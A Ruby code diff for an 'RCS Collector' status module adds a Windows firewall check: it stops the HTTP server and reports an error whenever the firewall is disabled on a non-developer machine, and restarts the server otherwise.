@@ -1,8 +1,10 @@
 require 'rcs-common/trace'
 require 'rcs-common/systemstatus'
 require 'rcs-common/heartbeat'
+require 'rcs-common/winfirewall'
 
-require_relative 'sessions.rb'
+require_relative 'sessions'
+require_relative 'firewall'
 
 module RCS
   module Collector
@@ -21,7 +23,28 @@ module RCS
         !!DB.instance.connected?
       end
 
+      after_heartbeat do
+        if firewall_disabled?
+          trace(:error, "Firewall is disabled. You must turn it on. The http server will #{HttpServer.running? ? 'stop now' : 'remain disabled'}")
+          HttpServer.stop
+        elsif !HttpServer.running?
+          HttpServer.start
+        end
+      end
+
+      def firewall_disabled?
+        @_firewall_disabled ||= (!Firewall.developer_machine? and Firewall.disabled?)
+      end
+
+      def status
+        firewall_disabled? ? 'ERROR' : super()
+      end
+
       def message
+        if firewall_disabled?
+          return "Windows Firewall is disabled"
+        end
+
         # retrieve how many session we have
         # this number represents the number of agent that are synchronizing
         active_sessions = SessionManager.instance.length
